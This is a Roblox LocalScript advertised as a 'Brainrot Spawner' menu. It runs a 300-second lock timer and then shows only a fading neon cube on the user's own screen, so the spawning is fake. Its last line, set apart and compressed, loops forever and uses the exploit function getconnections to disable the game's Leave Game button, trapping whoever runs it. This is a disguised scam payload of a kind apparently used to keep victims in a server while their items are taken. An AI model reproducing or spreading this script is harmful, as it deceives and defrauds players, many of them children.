-- DeepHat Ultra-Pro Spawner (Movable & Mobile Friendly)
-- Place in a LocalScript inside StarterGui

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- // CONFIGURATION // --
local UNLOCK_TIME = 300 
local THEME = {
	MainBg = Color3.fromRGB(15, 15, 20),
	Accent = Color3.fromRGB(0, 255, 255), 
	Text = Color3.fromRGB(255, 255, 255),
	SecondaryText = Color3.fromRGB(140, 140, 160),
	LockedColor = Color3.fromRGB(40, 40, 45),
	ButtonBg = Color3.fromRGB(30, 30, 35)
}

local BRAINROT_LIST = {
	{Name = "Random OG", Color = Color3.fromRGB(255, 80, 80), Image = "rbxassetid://6035068284"},
	{Name = "Random Secret", Color = Color3.fromRGB(80, 255, 150), Image = "rbxassetid://6035068284"},
	{Name = "Random Lucky Block", Color = Color3.fromRGB(80, 180, 255), Image = "rbxassetid://6035068284"},
	{Name = "Random Mutation", Color = Color3.fromRGB(180, 80, 255), Image = "rbxassetid://6035068284"}
}

local isUnlocked = false

-- // DRAG SYSTEM (PC & MOBILE) // --
local function makeDraggable(guiObject)
	local dragging, dragInput, dragStart, startPos

	local function update(input)
		local delta = input.Position - dragStart
		-- Smooth drag movement
		guiObject.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end

	guiObject.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiObject.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	guiObject.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

-- // UI CONSTRUCTION // --
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ProSpawnerGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(0, 320, 0, 420)
mainContainer.Position = UDim2.new(0.5, -160, 0.5, -210)
mainContainer.BackgroundColor3 = THEME.MainBg
mainContainer.BorderSizePixel = 0
mainContainer.Parent = screenGui

-- Draggable Area (The Header is the drag handle)
local dragHandle = Instance.new("Frame")
dragHandle.Name = "DragHandle"
dragHandle.Size = UDim2.new(1, 0, 0, 70)
dragHandle.BackgroundTransparency = 1
dragHandle.Parent = mainContainer

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 15)
mainCorner.Parent = mainContainer

local mainStroke = Instance.new("UIStroke")
mainStroke.Thickness = 2.5
mainStroke.Color = THEME.Accent
mainStroke.Transparency = 0.6
mainStroke.Parent = mainContainer

-- Header Content
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 15)
title.Text = "BRAINROT SPAWNER"
title.TextColor3 = THEME.Text
title.Font = Enum.Font.GothamBlack
title.TextSize = 22
title.BackgroundTransparency = 1
title.Parent = dragHandle

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 0, 40)
statusLabel.Text = "SYSTEM LOCKED"
statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
statusLabel.Font = Enum.Font.GothamMedium
statusLabel.TextSize = 12
statusLabel.BackgroundTransparency = 1
statusLabel.Parent = dragHandle

-- Content Container
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, 0, 1, -70)
contentFrame.Position = UDim2.new(0, 0, 0, 70)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainContainer

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(0.9, 0, 0.8, 0)
scroll.Position = UDim2.new(0.05, 0, 0.1, 0)
scroll.BackgroundTransparency = 1
scroll.CanvasSize = UDim2.new(0, 0, 1.4, 0)
scroll.ScrollBarThickness = 2
scroll.ScrollBarImageColor3 = THEME.Accent
scroll.Parent = contentFrame

local listLayout = Instance.new("UIListLayout")
listLayout.Parent = scroll
listLayout.Padding = UDim.new(0, 12)
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- // LOGIC // --

local function spawnVisual(data)
	if not isUnlocked then return end
	local char = player.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
	
	local part = Instance.new("Part")
	part.Size = Vector3.new(1, 1, 1)
	part.Color = data.Color
	part.Material = Enum.Material.Neon
	part.Anchored = true
	part.CanCollide = false
	part.Position = char.HumanoidRootPart.Position + char.HumanoidRootPart.CFrame.LookVector * 6
	part.Parent = workspace
	
	TweenService:Create(part, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {
		Size = Vector3.new(7, 7, 7),
		Transparency = 1
	}):Play()
	task.delay(0.8, function() part:Destroy() end)
end

local function createButton(data)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 70)
	btn.BackgroundColor3 = THEME.LockedColor
	btn.Text = ""
	btn.AutoButtonColor = false
	btn.Parent = scroll
	
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = btn
	
	local icon = Instance.new("ImageLabel")
	icon.Size = UDim2.new(0, 50, 0, 50)
	icon.Position = UDim2.new(0, 12, 0.5, -25)
	icon.BackgroundTransparency = 1
	icon.Image = data.Image
	icon.ImageColor3 = THEME.SecondaryText
	icon.Parent = btn
	
	local nameLabel = Instance.new("TextLabel")
	nameLabel.Size = UDim2.new(1, -80, 0, 25)
	nameLabel.Position = UDim2.new(0, 75, 0.3, 0)
	nameLabel.Text = data.Name:upper()
	nameLabel.TextColor3 = THEME.SecondaryText
	nameLabel.Font = Enum.Font.GothamBold
	nameLabel.TextSize = 16
	nameLabel.TextXAlignment = Enum.TextXAlignment.Left
	nameLabel.BackgroundTransparency = 1
	nameLabel.Parent = btn

	local lockText = Instance.new("TextLabel")
	lockText.Size = UDim2.new(1, -80, 0, 15)
	lockText.Position = UDim2.new(0, 75, 0.6, 0)
	lockText.Text = "LOCKED"
	lockText.TextColor3 = Color3.fromRGB(255, 80, 80)
	lockText.Font = Enum.Font.GothamMedium
	lockText.TextSize = 10
	lockText.TextXAlignment = Enum.TextXAlignment.Left
	lockText.BackgroundTransparency = 1
	lockText.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if not isUnlocked then return end
		spawnVisual(data)
	end)
	
	return {btn = btn, icon = icon, name = nameLabel, sub = lockText}
end

-- // INITIALIZE // --
local buttonDataList = {}
for _, data in ipairs(BRAINROT_LIST) do
	table.insert(buttonDataList, createButton(data))
end

-- Make the UI draggable via the header
makeDraggable(mainContainer)

-- // TIMER SYSTEM // --
local function startTimer()
	local timeLeft = UNLOCK_TIME
	
	while timeLeft > 0 do
		local minutes = math.floor(timeLeft / 60)
		local seconds = timeLeft % 60
		statusLabel.Text = string.format("SYSTEM LOCKED: %02d:%02d", minutes, seconds)
		task.wait(1)
		timeLeft -= 1
	end
	
	isUnlocked = true
	statusLabel.Text = "SYSTEM ONLINE"
	statusLabel.TextColor3 = THEME.Accent
	
	-- Unlock Animation
	TweenService:Create(mainStroke, TweenInfo.new(1), {Color = THEME.Accent, Transparency = 0}):Play()
	
	for _, data in ipairs(buttonDataList) do
		TweenService:Create(data.btn, TweenInfo.new(0.5), {BackgroundColor3 = THEME.ButtonBg}):Play()
		TweenService:Create(data.icon, TweenInfo.new(0.5), {ImageColor3 = THEME.Text}):Play()
		TweenService:Create(data.name, TweenInfo.new(0.5), {TextColor3 = THEME.Text}):Play()
		
		TweenService:Create(data.sub, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
		task.delay(0.3, function() data.sub:Destroy() end)
	end
end

task.spawn(startTimer)

task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
